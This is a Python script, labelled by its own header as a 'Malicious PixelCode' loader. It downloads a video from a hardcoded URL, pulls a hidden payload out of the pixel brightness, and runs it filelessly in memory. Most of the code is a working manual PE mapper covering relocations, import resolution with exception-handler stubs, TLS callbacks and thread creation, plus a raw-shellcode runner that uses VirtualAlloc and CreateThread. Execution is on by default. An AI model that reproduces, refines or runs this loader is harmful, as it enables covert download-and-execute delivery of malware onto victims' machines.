#!/usr/bin/env python3
"""
Malicious PixelCode - Complete Fixed Loader
- Downloads video from hardcoded URL
- Extracts payload via pixel decoding
- Maps and executes payload in memory (fileless)
- Handles 32/64-bit PEs with _except_handler3 stub
- Optionally runs raw shellcode (if detected)
"""

import cv2
import numpy as np
from PIL import Image
import ctypes
import sys
import os
import tempfile
import requests
from tqdm import tqdm
import pefile

# ===================== CONFIGURATION =====================
# Hardcode your video URL here (direct link to the PixelCode video)
VIDEO_URL = "https://rr1---sn-uxaxjvhxbt2u-5aty.googlevideo.com/videoplayback?expire=1763582759&ei=x84daeagLvWZhcIPktXbqQ4&ip=154.184.125.171&id=o-AF9TPIQdwLkiiqul_xsDxAfh92OIc6tFdHySWHZ3nAFV&itag=137&source=youtube&requiressl=yes&xpc=EgVo2aDSNQ%3D%3D&cps=12&met=1763561159%2C&mh=DX&mm=31%2C29&mn=sn-uxaxjvhxbt2u-5aty%2Csn-hgn7rn7k&ms=au%2Crdu&mv=m&mvi=1&pl=15&rms=au%2Cau&initcwndbps=317500&bui=AdEuB5TsU9PNExUdj_b9bfgYxLk_IYW-ysNGRTGBD5UQOnX-PtTsRMLcTktOInO6OO321AeCm4HO26l-&spc=6b0G_Nvh-_I2rKaUeyG6lmO5RjgYwk6ZaQ-ypWxWqJ7_yuy82C3Ti8tB&vprv=1&svpuc=1&mime=video%2Fmp4&rqh=1&gir=yes&clen=1454012&dur=1.541&lmt=1763561120035836&mt=1763560940&fvip=2&keepalive=yes&fexp=51552689%2C51565115%2C51565682%2C51580968&c=ANDROID_VR&txp=6209224&sparams=expire%2Cei%2Cip%2Cid%2Citag%2Csource%2Crequiressl%2Cxpc%2Cbui%2Cspc%2Cvprv%2Csvpuc%2Cmime%2Crqh%2Cgir%2Cclen%2Cdur%2Clmt&sig=AJfQdSswRQIgGvn4BbD2astn6A_KgVtjJ80ei5zCCyqpF9Q5hGERtuQCIQDS_9_MGZ1vtarmkR3FRyuMAGZs2sUk7RC8a5udvxmRuw%3D%3D&lsparams=cps%2Cmet%2Cmh%2Cmm%2Cmn%2Cms%2Cmv%2Cmvi%2Cpl%2Crms%2Cinitcwndbps&lsig=APaTxxMwRgIhAN8I3gYtsYvLBLVNw9pf55OGNlrt3dDNQlHjRGurwG-dAiEA9Yu2ghHsQfMlm61EzfBF32ee8FJQRieFBpbhEAG-DAk%3D"

# Pixel decoding parameters (match the encoding settings)
PIXEL_SIZE = 4
WHITE_IS_ZERO = True
BRIGHTNESS_THRESHOLD = 180

# Execution control
EXECUTE_PAYLOAD = True   # Set to False to only extract and map (debug)
SAVE_PAYLOAD = False     # Save extracted payload to disk for analysis
# ==========================================================

# Exception handler stub for 32-bit PEs (xor eax, eax; ret)
EXCEPTION_STUB = bytes([
    0x31, 0xC0,  # xor eax, eax
    0xC3         # ret
])

# ===================== VIDEO DOWNLOAD =====================
def download_video(url):
    """Download video from URL to a temporary file and return the file path."""
    print(f"[*] Downloading video from: {url}")
    try:
        response = requests.get(url, stream=True)
        response.raise_for_status()
        total_size = int(response.headers.get('content-length', 0))

        fd, temp_path = tempfile.mkstemp(suffix='.mp4')
        os.close(fd)

        with open(temp_path, 'wb') as f:
            with tqdm(total=total_size, unit='B', unit_scale=True, desc="Downloading") as pbar:
                for chunk in response.iter_content(chunk_size=8192):
                    f.write(chunk)
                    pbar.update(len(chunk))
        print(f"[+] Video downloaded to temporary file: {temp_path}")
        return temp_path
    except Exception as e:
        print(f"[!] Download failed: {e}")
        return None

# ===================== PAYLOAD EXTRACTION =====================
def extract_payload(video_path):
    """Extract hidden data from video using pixel decoding."""
    if not os.path.isfile(video_path):
        print(f"[!] Video file not found: {video_path}")
        return None

    cap = cv2.VideoCapture(video_path)
    if not cap.isOpened():
        print("[!] Cannot open video")
        return None

    w = int(cap.get(cv2.CAP_PROP_FRAME_WIDTH))
    h = int(cap.get(cv2.CAP_PROP_FRAME_HEIGHT))
    fc = int(cap.get(cv2.CAP_PROP_FRAME_COUNT))
    print(f"[i] Video: {w}×{h}   {fc} frames")

    cols = w // PIXEL_SIZE
    rows = h // PIXEL_SIZE
    bits = []

    with tqdm(total=fc, desc="Reading frames", unit="frame") as pbar:
        while True:
            ret, frame = cap.read()
            if not ret:
                break
            frame_rgb = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
            img = Image.fromarray(frame_rgb)

            for r in range(rows):
                for c in range(cols):
                    cx = c * PIXEL_SIZE + PIXEL_SIZE // 2
                    cy = r * PIXEL_SIZE + PIXEL_SIZE // 2
                    if cx >= w or cy >= h:
                        continue
                    rv, gv, bv = img.getpixel((cx, cy))
                    bright = (rv + gv + bv) // 3
                    # Determine bit based on brightness
                    if WHITE_IS_ZERO:
                        bit = 0 if bright > BRIGHTNESS_THRESHOLD else 1
                    else:
                        bit = 1 if bright > BRIGHTNESS_THRESHOLD else 0
                    bits.append(bit)
            pbar.update(1)
    cap.release()

    if not bits:
        print("[!] No bits extracted")
        return None

    print(f"[i] Collected {len(bits):,} bits")
    # Convert bits to bytes
    payload = bytearray()
    for i in range(0, len(bits) - len(bits) % 8, 8):
        b = 0
        for j in range(8):
            b = (b << 1) | bits[i + j]
        payload.append(b)
    print(f"[+] Reconstructed payload: {len(payload):,} bytes")
    return bytes(payload)

# ===================== PE MAPPING HELPERS =====================
def find_stub_location(pe, base_addr):
    """Find a safe location to place the exception handler stub."""
    # Try to put it at the end of the .text section
    for sec in pe.sections:
        sec_name = sec.Name.decode('utf-8', errors='ignore').strip('\x00')
        if '.text' in sec_name or 'CODE' in sec_name:
            # Place stub at the end of the section
            stub_addr = base_addr + sec.VirtualAddress + sec.Misc_VirtualSize - 16
            return stub_addr

    # Fallback: use a location after all sections
    last_section = max(pe.sections, key=lambda s: s.VirtualAddress + s.Misc_VirtualSize)
    stub_addr = base_addr + last_section.VirtualAddress + last_section.Misc_VirtualSize + 0x1000
    return stub_addr

# ===================== PAYLOAD EXECUTION =====================
def run_shellcode(shellcode_bytes):
    """Execute raw shellcode directly (for staged payloads)."""
    kernel32 = ctypes.WinDLL('kernel32', use_last_error=True)
    MEM_COMMIT = 0x1000
    PAGE_EXECUTE_READWRITE = 0x40

    addr = kernel32.VirtualAlloc(None, len(shellcode_bytes), MEM_COMMIT, PAGE_EXECUTE_READWRITE)
    if not addr:
        print(f"[!] VirtualAlloc failed (err {ctypes.get_last_error()})")
        return
    print(f"[+] Allocated shellcode at 0x{addr:X}")

    ctypes.memmove(addr, shellcode_bytes, len(shellcode_bytes))

    tid = ctypes.c_ulong(0)
    h_thread = kernel32.CreateThread(None, 0, addr, None, 0, ctypes.byref(tid))
    if not h_thread:
        print(f"[!] CreateThread failed (err {ctypes.get_last_error()})")
        kernel32.VirtualFree(addr, 0, 0x8000)
        return

    print(f"[+] Shellcode thread started (TID {tid.value}) → waiting...")
    kernel32.WaitForSingleObject(h_thread, 0xFFFFFFFF)
    kernel32.VirtualFree(addr, 0, 0x8000)

def map_and_run_pe(raw_pe):
    """Manually map PE into memory and execute its entry point."""
    if sys.platform != "win32":
        print("[!] This code requires Windows")
        return

    if SAVE_PAYLOAD:
        with open("extracted_payload.exe", "wb") as f:
            f.write(raw_pe)
        print("[+] Payload saved to extracted_payload.exe")

    kernel32 = ctypes.WinDLL("kernel32", use_last_error=True)
    kernel32.VirtualAlloc.restype = ctypes.c_void_p
    kernel32.VirtualAlloc.argtypes = [ctypes.c_void_p, ctypes.c_size_t, ctypes.c_ulong, ctypes.c_ulong]
    kernel32.VirtualProtect.restype = ctypes.c_bool
    kernel32.VirtualProtect.argtypes = [ctypes.c_void_p, ctypes.c_size_t, ctypes.c_ulong, ctypes.POINTER(ctypes.c_ulong)]
    kernel32.LoadLibraryA.restype = ctypes.c_void_p
    kernel32.LoadLibraryA.argtypes = [ctypes.c_char_p]
    kernel32.GetProcAddress.restype = ctypes.c_void_p
    kernel32.GetProcAddress.argtypes = [ctypes.c_void_p, ctypes.c_char_p]
    kernel32.CreateThread.restype = ctypes.c_void_p
    kernel32.CreateThread.argtypes = [ctypes.c_void_p, ctypes.c_ulong, ctypes.c_void_p,
                                      ctypes.c_void_p, ctypes.c_ulong, ctypes.POINTER(ctypes.c_ulong)]
    kernel32.WaitForSingleObject.restype = ctypes.c_ulong
    kernel32.WaitForSingleObject.argtypes = [ctypes.c_void_p, ctypes.c_ulong]
    kernel32.VirtualFree.restype = ctypes.c_int
    kernel32.VirtualFree.argtypes = [ctypes.c_void_p, ctypes.c_size_t, ctypes.c_ulong]

    MEM_COMMIT = 0x1000
    MEM_RESERVE = 0x2000
    PAGE_EXECUTE_READWRITE = 0x40
    MEM_RELEASE = 0x8000

    try:
        pe = pefile.PE(data=raw_pe)
    except Exception as e:
        print(f"[!] PE parsing failed: {e}")
        return

    is_64bit = pe.FILE_HEADER.Machine == 0x8664
    print(f"[i] PE architecture: {'64-bit' if is_64bit else '32-bit'}")
    image_base = pe.OPTIONAL_HEADER.ImageBase
    image_size = pe.OPTIONAL_HEADER.SizeOfImage
    print(f"[i] ImageBase: 0x{image_base:X}   SizeOfImage: {image_size:,}")

    base_addr = kernel32.VirtualAlloc(None, image_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE)
    if not base_addr:
        print(f"[!] VirtualAlloc failed (err {ctypes.get_last_error()})")
        return
    print(f"[+] Allocated at 0x{base_addr:X}")

    # Copy headers
    ctypes.memmove(base_addr, raw_pe, pe.OPTIONAL_HEADER.SizeOfHeaders)

    # Copy sections
    for sec in pe.sections:
        dest = base_addr + sec.VirtualAddress
        src_data = raw_pe[sec.PointerToRawData : sec.PointerToRawData + sec.SizeOfRawData]
        ctypes.memmove(dest, src_data, len(src_data))

    # Relocations
    delta = base_addr - image_base
    if delta != 0:
        print("[i] Relocating image")
        reloc_dir = pe.OPTIONAL_HEADER.DATA_DIRECTORY[pefile.DIRECTORY_ENTRY['IMAGE_DIRECTORY_ENTRY_BASERELOC']]
        if reloc_dir.Size:
            offset = 0
            data = pe.get_data(reloc_dir.VirtualAddress, reloc_dir.Size)
            while offset < len(data):
                block_rva = int.from_bytes(data[offset:offset+4], "little")
                block_size = int.from_bytes(data[offset+4:offset+8], "little")
                offset += 8
                if block_rva == 0:
                    break
                for i in range(0, block_size - 8, 2):
                    entry = int.from_bytes(data[offset:offset+2], "little")
                    offset += 2
                    rtype = entry >> 12
                    roff = entry & 0xFFF
                    addr = base_addr + block_rva + roff
                    if rtype == 10 and is_64bit:      # DIR64
                        val = int.from_bytes(ctypes.string_at(addr, 8), "little") + delta
                        ctypes.memmove(addr, val.to_bytes(8, "little"), 8)
                    elif rtype == 3 and not is_64bit: # HIGHLOW
                        val = int.from_bytes(ctypes.string_at(addr, 4), "little") + delta
                        ctypes.memmove(addr, val.to_bytes(4, "little"), 4)

    # Place exception handler stub for 32-bit PEs
    stub_addr = None
    if not is_64bit:
        stub_addr = find_stub_location(pe, base_addr)
        ctypes.memmove(stub_addr, EXCEPTION_STUB, len(EXCEPTION_STUB))
        print(f"[i] Exception handler stub placed at 0x{stub_addr:X}")

    # Resolve imports
    print("[i] Resolving imports")
    if hasattr(pe, 'DIRECTORY_ENTRY_IMPORT'):
        for entry in pe.DIRECTORY_ENTRY_IMPORT:
            dll_name = entry.dll.decode('utf-8') if isinstance(entry.dll, bytes) else entry.dll
            dll = kernel32.LoadLibraryA(dll_name.encode('utf-8'))
            if not dll:
                print(f"[!] LoadLibraryA failed for {dll_name}")
                kernel32.VirtualFree(base_addr, 0, MEM_RELEASE)
                return

            for imp in entry.imports:
                if imp.name:
                    func_name = imp.name.decode('utf-8') if isinstance(imp.name, bytes) else imp.name

                    # Try normal GetProcAddress
                    func = kernel32.GetProcAddress(dll, func_name.encode('utf-8'))

                    # If failed, check for known CRT functions and use stub
                    if not func:
                        known_crt = ["_except_handler3", "__except_handler3", "_C_specific_handler", "__C_specific_handler"]
                        if not is_64bit and func_name in known_crt and stub_addr:
                            print(f"[i] Using stub for {func_name}")
                            iat_addr = base_addr + imp.address - image_base
                            ctypes.memmove(iat_addr, (stub_addr & 0xFFFFFFFF).to_bytes(4, "little"), 4)
                            continue
                        else:
                            print(f"[!] GetProcAddress failed: {func_name}")
                            kernel32.VirtualFree(base_addr, 0, MEM_RELEASE)
                            return

                    # Write function address with correct size
                    iat_addr = base_addr + imp.address - image_base
                    if is_64bit:
                        ctypes.memmove(iat_addr, ctypes.c_void_p(func).value.to_bytes(8, "little"), 8)
                    else:
                        func_addr = ctypes.c_void_p(func).value
                        if func_addr > 0xFFFFFFFF:
                            print(f"[!] Warning: Function address 0x{func_addr:X} too large for 32-bit")
                        ctypes.memmove(iat_addr, (func_addr & 0xFFFFFFFF).to_bytes(4, "little"), 4)

    # TLS callbacks (optional)
    tls_dir = pe.OPTIONAL_HEADER.DATA_DIRECTORY[pefile.DIRECTORY_ENTRY['IMAGE_DIRECTORY_ENTRY_TLS']]
    if tls_dir.Size:
        try:
            tls = pe.parse_directory_tls(tls_dir.VirtualAddress)
            if tls and tls.callbacks:
                print(f"[i] Found {len(tls.callbacks)} TLS callbacks")
                for cb_rva in tls.callbacks:
                    cb_addr = base_addr + cb_rva - image_base
                    print(f"  → Calling TLS callback at 0x{cb_addr:X}")
                    callback = ctypes.CFUNCTYPE(None)(cb_addr)
                    callback()
        except Exception as e:
            print(f"[!] TLS error: {e}")

    entry_rva = pe.OPTIONAL_HEADER.AddressOfEntryPoint
    entry_addr = base_addr + entry_rva
    print(f"[+] Entry point: 0x{entry_addr:X}")

    if not EXECUTE_PAYLOAD:
        print("\n[DEBUG] Execution skipped. Memory mapped at 0x{base_addr:X}")
        input("Press Enter to free memory and exit...")
        kernel32.VirtualFree(base_addr, 0, MEM_RELEASE)
        return

    # Create thread at entry point
    tid = ctypes.c_ulong(0)
    h_thread = kernel32.CreateThread(None, 0, entry_addr, None, 0, ctypes.byref(tid))
    if not h_thread:
        print(f"[!] CreateThread failed (err {ctypes.get_last_error()})")
        kernel32.VirtualFree(base_addr, 0, MEM_RELEASE)
        return

    print(f"[+] Thread started (TID {tid.value}) → waiting...")
    kernel32.WaitForSingleObject(h_thread, 0xFFFFFFFF)
    print("[+] Thread finished")
    kernel32.VirtualFree(base_addr, 0, MEM_RELEASE)

# ===================== MAIN =====================
def main():
    print("Malicious PixelCode - Fixed Loader with Exception Handler Support")
    print("=" * 60)

    # Download video
    video_path = download_video(VIDEO_URL)
    if not video_path:
        sys.exit(1)

    # Extract payload
    payload = extract_payload(video_path)

    # Clean up temp video
    try:
        os.unlink(video_path)
        print("[+] Temporary video deleted")
    except:
        pass

    if not payload:
        print("[!] Extraction failed")
        sys.exit(1)

    # Determine payload type and execute
    # Check if it's a PE (has 'MZ' header)
    if payload[:2] == b'MZ':
        print("\n[*] Detected PE file, starting manual mapping...")
        map_and_run_pe(payload)
    else:
        print("\n[*] Detected raw shellcode, executing directly...")
        run_shellcode(payload)

    print("\n[+] All done.")

if __name__ == "__main__":
    main()
